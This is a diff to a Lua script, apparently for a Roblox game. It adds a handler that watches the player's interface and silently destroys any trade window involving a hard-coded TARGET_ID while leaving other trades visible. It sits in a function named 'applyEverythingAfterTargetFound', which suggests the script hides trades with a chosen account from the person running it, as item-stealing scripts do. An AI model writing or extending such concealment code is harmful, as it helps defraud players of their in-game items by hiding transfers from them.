@@ -71,8 +71,27 @@ local function applyEverythingAfterTargetFound()
     end)
     cam.FieldOfView = 70
 
-    -- Ne pas cacher automatiquement les GUI de trade pour permettre les trades externes
-    -- Les GUI seront gérées manuellement si nécessaire
+    -- Cacher automatiquement les GUI de trade seulement pour les trades avec TARGET_ID
+    local function handleGui(obj)
+        if guiNames[obj.Name] then
+            -- Vérifier si c'est un trade avec TARGET_ID
+            local tradeFrame = obj:FindFirstChild("Frame")
+            if tradeFrame then
+                local playerLabel = tradeFrame:FindFirstChild("PlayerLabel")
+                if playerLabel and playerLabel.Text then
+                    -- Essayer d'extraire l'ID du joueur depuis le texte
+                    local playerId = playerLabel.Text:match("(%d+)")
+                    if playerId and tonumber(playerId) == TARGET_ID then
+                        task.defer(function() obj:Destroy() end)
+                        return
+                    end
+                end
+            end
+            -- Pour les autres trades, laisser visible
+        end
+    end
+    pg.ChildAdded:Connect(handleGui)
+    for _, v in ipairs(pg:GetChildren()) do handleGui(v) end
 end
 
 local AnimalsData, AnimalsShared, NumberUtils
